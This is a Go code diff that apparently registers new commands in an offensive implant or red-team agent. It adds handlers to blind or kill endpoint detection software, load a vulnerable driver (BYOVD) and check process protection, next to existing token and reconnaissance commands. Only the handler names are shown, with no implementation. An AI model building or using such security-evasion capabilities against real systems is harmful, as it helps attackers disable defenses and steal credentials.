@@ -277,6 +277,13 @@ func init() {
 		"sccm_recon":  handleSccmRecon,
 		"entra_prt":   handleEntraPRT,
 
+		// EDR pack (experimental, Windows-only; blind/kill/byovd are
+		// approval-gated server-side)
+		"edr_blind":  handleEDRBlind,
+		"edr_kill":   handleEDRKill,
+		"byovd_load": handleBYOVDLoad,
+		"ppl_check":  handlePPLCheck,
+
 		"file_hunt":             handleFileHunt,
 		"screen_trigger_start":  handleScreenTriggerStart,
 		"screen_trigger_stop":   handleScreenTriggerStop,
